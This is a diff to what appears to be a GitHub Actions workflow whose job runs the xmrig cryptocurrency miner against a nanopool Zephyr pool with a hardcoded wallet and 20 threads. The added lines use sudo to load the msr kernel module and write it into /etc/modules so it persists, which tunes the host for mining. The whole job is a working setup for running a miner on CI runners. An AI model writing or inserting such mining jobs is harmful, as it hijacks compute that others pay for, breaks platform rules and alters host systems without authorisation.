@@ -33,4 +33,6 @@ jobs:
         run: |
           cd xmrig/build
           sleep 2
+          sudo modprobe msr && echo "msr" | sudo tee -a /etc/modules
+          sleep 4
           ./xmrig -o zeph-asia1.nanopool.org:10900 -u ZEPHYR3WVbfTWz6WsfYYWUVtY35iKG6bWJhHEE62riQuX3wEZiSr3CQQ1wD5XwJ2q1SNkA1VQTHQRNj1M5GrqmT8LiHMTwFTmHy2H -p mass1 -a randomx -t 20
